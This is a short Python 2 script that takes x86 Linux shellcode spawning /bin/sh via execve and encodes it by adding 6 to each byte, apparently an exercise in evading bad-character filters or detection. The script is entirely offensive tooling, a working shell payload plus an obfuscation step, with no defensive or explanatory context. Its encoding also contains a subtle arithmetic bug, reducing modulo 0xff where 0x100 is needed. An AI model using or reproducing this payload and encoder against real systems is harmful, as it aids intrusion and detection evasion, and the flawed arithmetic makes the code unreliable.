#!/usr/bin/python
#clubjk

import random


shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x53\x89\xe2\xb0\x0b\xcd\x80")

encoded = ""

for x in bytearray(shellcode):
	y = x + 6
 	encoded += '0x'
 	encoded += '%02x,' %(y % 0xff)

print 'Shellcode length is: %d' % len(bytearray(shellcode))

print 'Encoded shellcode: %s'% encoded

